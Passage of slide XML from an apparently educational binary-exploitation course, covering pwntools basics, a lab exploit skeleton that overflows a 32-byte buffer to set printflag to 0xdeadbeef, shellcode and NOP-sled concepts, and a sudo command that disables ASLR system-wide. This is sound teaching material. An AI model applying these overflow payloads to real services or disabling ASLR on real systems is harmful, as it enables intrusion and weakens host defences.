          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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7875" y="2985306"/>
            <a:ext cx="1785938" cy="921544"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="34023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printflag [ 4 bytes ]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28625" y="4306900"/>
            <a:ext cx="8286750" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F4F4F4"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="4306900"/>
            <a:ext cx="57150" cy="571500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19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="4306900"/>
            <a:ext cx="8286750" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="255143" tIns="170053" rIns="255143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Analogy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" i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Think of it like spilling water from one cup into the next. If the first cup is full, the excess has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" i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nowhere to go but into its neighbor.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28625" y="4850606"/>
            <a:ext cx="8286750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8415338" y="4614863"/>
            <a:ext cx="300038" cy="3857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23</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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pwntools speaks TCP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428625" y="1457325"/>
            <a:ext cx="4036219" cy="12858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Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1457325"/>
            <a:ext cx="4036219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8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4457700" y="1457325"/>
            <a:ext cx="7144" cy="12858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9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2736056"/>
            <a:ext cx="4036219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0" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1457325"/>
            <a:ext cx="85725" cy="1285875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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9" y="1603772"/>
            <a:ext cx="214313" cy="1714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28688" y="1600200"/>
            <a:ext cx="1509006" cy="1785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remote(ip, port)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07219" y="1885950"/>
            <a:ext cx="3679031" cy="3599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Connects to a network service. Creates a socket object to talk to the target.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679156" y="1457325"/>
            <a:ext cx="4036219" cy="12858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Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="1457325"/>
            <a:ext cx="4036219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6" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8708231" y="1457325"/>
            <a:ext cx="7144" cy="12858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7" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="2736056"/>
            <a:ext cx="4036219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8" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="1457325"/>
            <a:ext cx="85725" cy="1285875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill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1603772"/>
            <a:ext cx="171450" cy="1714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36356" y="1600200"/>
            <a:ext cx="754503" cy="17859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recvn(n)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857750" y="1885950"/>
            <a:ext cx="3679031" cy="3599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Reads exactly </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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bytes. Perfect for clearing specific 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prompts or fixed-length data.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28625" y="2957513"/>
            <a:ext cx="4036219" cy="12858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Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2957513"/>
            <a:ext cx="4036219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4" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4457700" y="2957513"/>
            <a:ext cx="7144" cy="12858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5" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="4236244"/>
            <a:ext cx="4036219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6" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2957513"/>
            <a:ext cx="85725" cy="1285875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill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3103959"/>
            <a:ext cx="171450" cy="17145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85825" y="3100388"/>
            <a:ext cx="943142" cy="17859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send(data)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07219" y="3386138"/>
            <a:ext cx="3679031" cy="3599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Sends your payload to the service. Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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sendline()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to </a:t>
            </a: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include a newline.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4679156" y="2957513"/>
            <a:ext cx="4036219" cy="12858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1" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="2957513"/>
            <a:ext cx="4036219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2" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8708231" y="2957513"/>
            <a:ext cx="7144" cy="12858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3" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="4236244"/>
            <a:ext cx="4036219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4" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4679156" y="2957513"/>
            <a:ext cx="85725" cy="1285875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill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3103959"/>
            <a:ext cx="150019" cy="17145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114925" y="3100388"/>
            <a:ext cx="943142" cy="17859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recvline()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4857750" y="3386138"/>
            <a:ext cx="3679031" cy="3599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Reads data until a newline character is found. Useful for reading flags or responses.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428625" y="4850606"/>
            <a:ext cx="8286750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39" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8393906" y="4614863"/>
            <a:ext cx="321469" cy="3857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24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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32 bytes of junk, then the magic number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428625" y="1460897"/>
            <a:ext cx="2503884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Send 32 bytes of padding to fill the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932509" y="1457325"/>
            <a:ext cx="342900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buff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275409" y="1460897"/>
            <a:ext cx="421481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array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28625" y="1660922"/>
            <a:ext cx="842963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completely.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28625" y="2043113"/>
            <a:ext cx="607219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Append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035844" y="2039541"/>
            <a:ext cx="1285875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p32(0xdeadbeef)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321719" y="2043113"/>
            <a:ext cx="1150144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overwrite the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28625" y="2246709"/>
            <a:ext cx="685800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adjacent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14425" y="2243138"/>
            <a:ext cx="771525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printflag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885950" y="2246709"/>
            <a:ext cx="650081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variable.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28625" y="2628900"/>
            <a:ext cx="1643063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program checks if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071688" y="2625328"/>
            <a:ext cx="1971675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printflag == 0xdeadbeef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28625" y="2828925"/>
            <a:ext cx="1328738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release the flag.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28625" y="3243263"/>
            <a:ext cx="3636783" cy="450056"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF9C4"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3243263"/>
            <a:ext cx="35719" cy="45005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1" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3243263"/>
            <a:ext cx="3636783" cy="450056"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="170053" tIns="127508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Note:</a:t>
            </a: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Test on your own server at port 1336 first. The real </a:t>
            </a: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service restarts every minute via cron.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351158" y="1457325"/>
            <a:ext cx="4364217" cy="250031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3" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4351158" y="1457325"/>
            <a:ext cx="71438" cy="2500313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4" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4494033" y="1600200"/>
            <a:ext cx="4078467" cy="1464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77777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Exploit Skeleton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494033" y="1746647"/>
            <a:ext cx="4078467" cy="1464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pwn import *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494033" y="1964531"/>
            <a:ext cx="4078467" cy="1464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connect = remote('127.0.0.1', 1336)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494033" y="2110978"/>
            <a:ext cx="4078467" cy="1464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connect.recvn(18) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="77777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Eat the prompt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494033" y="2328863"/>
            <a:ext cx="2623654" cy="1464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2C2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payload = "A"*32 + p32(0xdeadbeef)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494033" y="2475309"/>
            <a:ext cx="4078467" cy="1464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connect.send(payload)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494033" y="2693194"/>
            <a:ext cx="4078467" cy="1464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 connect.recvn(34) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="77777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Get the flag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28625" y="4850606"/>
            <a:ext cx="8286750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8397478" y="4614863"/>
            <a:ext cx="317897" cy="3857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25</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Lab 3 — Flip printflag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428625" y="1457325"/>
            <a:ext cx="250031" cy="250031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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1457325"/>
            <a:ext cx="250031" cy="25003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1531" y="1457325"/>
            <a:ext cx="4561284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 the challenge note to identify the target network port.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8625" y="1835944"/>
            <a:ext cx="250031" cy="250031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0" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1835944"/>
            <a:ext cx="250031" cy="25003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1531" y="1843088"/>
            <a:ext cx="335756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57288" y="1839516"/>
            <a:ext cx="1791686" cy="2143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checksec serve_test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948973" y="1843088"/>
            <a:ext cx="2378869" cy="21788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verify the binary's defenses.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8625" y="2214563"/>
            <a:ext cx="250031" cy="250031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5" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2214563"/>
            <a:ext cx="250031" cy="25003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1531" y="2214563"/>
            <a:ext cx="4243388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your logic locally by running a server on port 1336.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28625" y="2593181"/>
            <a:ext cx="250031" cy="250031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8" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2593181"/>
            <a:ext cx="250031" cy="25003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21531" y="2600325"/>
            <a:ext cx="3239691" cy="21788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Script the payload: 32 bytes of padding +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061222" y="2596753"/>
            <a:ext cx="1414463" cy="2143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p32(0xdeadbeef)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75684" y="2600325"/>
            <a:ext cx="32147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28625" y="2971800"/>
            <a:ext cx="250031" cy="250031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3" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2971800"/>
            <a:ext cx="250031" cy="25003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21531" y="2978944"/>
            <a:ext cx="2364581" cy="21788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Connect to the real port using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3186113" y="2975372"/>
            <a:ext cx="1508782" cy="2143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remote(ip, port)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694895" y="2978944"/>
            <a:ext cx="32147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28625" y="3350419"/>
            <a:ext cx="250031" cy="250031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8" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3350419"/>
            <a:ext cx="250031" cy="25003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21531" y="3350419"/>
            <a:ext cx="3418284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Capture the flag from the network response.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0" y="3839766"/>
            <a:ext cx="9144000" cy="589359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31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3982641"/>
            <a:ext cx="9144000" cy="3036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"You don't always need EIP. Sometimes the neighbour is enough."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28625" y="4850606"/>
            <a:ext cx="8286750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8404622" y="4614863"/>
            <a:ext cx="310753" cy="3857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26</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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If there's nothing to jump to, write it yourself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428625" y="1614488"/>
            <a:ext cx="1439466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if there is no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868091" y="1610916"/>
            <a:ext cx="942975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print_flag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811066" y="1614488"/>
            <a:ext cx="1600200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function to jump to?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28625" y="2057400"/>
            <a:ext cx="4000500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inject our own machine code (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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shellcode</a:t>
            </a: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 into </a:t>
            </a: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buffer.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28625" y="2743200"/>
            <a:ext cx="4000500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then redirect EIP to the start of our own code on the stack.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28625" y="3429000"/>
            <a:ext cx="4000500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input lives on the stack, so EIP jumps to the stack.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107781" y="1743075"/>
            <a:ext cx="3214688" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9144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07781" y="1743075"/>
            <a:ext cx="3214688" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="21259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Padding [ to reach EIP ]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661547" y="2386013"/>
            <a:ext cx="107156" cy="3214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107781" y="2778919"/>
            <a:ext cx="3214688" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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07781" y="2778919"/>
            <a:ext cx="3214688" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="21259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EIP -&gt; Stack Address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661547" y="3421856"/>
            <a:ext cx="107156" cy="3214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107781" y="3814763"/>
            <a:ext cx="3214688" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9144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07781" y="3814763"/>
            <a:ext cx="3214688" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="21259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Shellcode [ /bin/sh ]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28625" y="4850606"/>
            <a:ext cx="8286750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8429625" y="4614863"/>
            <a:ext cx="285750" cy="3857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27</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Freeze the addresses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428625" y="1600200"/>
            <a:ext cx="4000500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ASLR:</a:t>
            </a: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Address Space Layout Randomization moves </a:t>
            </a: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memory locations every time the program runs.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28625" y="2286000"/>
            <a:ext cx="4000500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beginners, we disable it so our stack address stays valid and predictable.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28625" y="2971800"/>
            <a:ext cx="4000500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NX:</a:t>
            </a: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Must be disabled for the stack to be executable </a:t>
            </a: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(already OFF for this lab).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14875" y="1600200"/>
            <a:ext cx="4000500" cy="142875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0" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4714875" y="1600200"/>
            <a:ext cx="71438" cy="1428750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11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4893469" y="1778794"/>
            <a:ext cx="3643313" cy="1321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Disable ASLR system-wide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893469" y="1910953"/>
            <a:ext cx="3643313" cy="2643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FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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echo 0 | sudo tee </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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/proc/sys/kernel/randomize_va_space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714875" y="3314700"/>
            <a:ext cx="4000500" cy="535781"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F4F4F4"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4714875" y="3314700"/>
            <a:ext cx="35719" cy="535781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5" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4714875" y="3314700"/>
            <a:ext cx="4000500" cy="535781"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="170053" tIns="170053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Note:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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Disabling ASLR makes the stack address constant, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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allowing our shellcode to land reliably.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28625" y="4850606"/>
            <a:ext cx="8286750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8401050" y="4614863"/>
            <a:ext cx="314325" cy="3857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28</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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2900" y="285750"/>
            <a:ext cx="1468041" cy="221456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="321469"/>
            <a:ext cx="115371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Hidden Investigations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42900" y="727323"/>
            <a:ext cx="8458200" cy="4107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000000"/>
                </a:solidFill>
                <a:latin typeface="Quicksand Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Quicksand Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Quicksand Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A Giant Landing Pad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342900" y="1366689"/>
            <a:ext cx="4129088" cy="4400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NOP (0x90):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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Short for "No Operation". It tells the CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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do nothing and move to the next byte.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42900" y="1878137"/>
            <a:ext cx="4129088" cy="4400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Concept:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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 long run of NOPs before your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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shellcode creates a "landing pad".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42900" y="2389584"/>
            <a:ext cx="4129088" cy="4400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Benefit:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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EIP can land anywhere in the NOP pad </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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"slide" down into the actual shellcode.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42900" y="2901032"/>
            <a:ext cx="4129088" cy="4400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Analogy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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Like a funnel or a large landing pad for a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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plane; you don't need to hit a precise pixel.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4994" y="1985293"/>
            <a:ext cx="2143125" cy="173950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1" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5736431" y="2056730"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9144">
            <a:solidFill>
              <a:srgbClr val="5555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36431" y="2056730"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Padding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5736431" y="2335337"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
          <a:ln w="9144">
            <a:solidFill>
              <a:srgbClr val="5555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36431" y="2335337"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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EIP -&gt; Points to Stack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5736431" y="2613943"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9144">
            <a:solidFill>
              <a:srgbClr val="55555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36431" y="2613943"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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NOP Sled (0x90...)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5736431" y="2892549"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9144">
            <a:solidFill>
              <a:srgbClr val="5555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36431" y="2892549"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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NOP Sled (0x90...)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5736431" y="3171155"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
          <a:ln w="9144">
            <a:solidFill>
              <a:srgbClr val="55555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36431" y="3171155"/>
            <a:ext cx="2000250" cy="257175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Shellcode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5736431" y="3492624"/>
            <a:ext cx="2000250" cy="12501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MEMORY LAYOUT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0" y="4429125"/>
            <a:ext cx="9144000" cy="428625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3" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4429125"/>
            <a:ext cx="9144000" cy="428625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="408178" tIns="102108" rIns="408178" bIns="102108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"A landing pad for your shellcode, turning a near-miss into a direct hit."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5" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4857750"/>
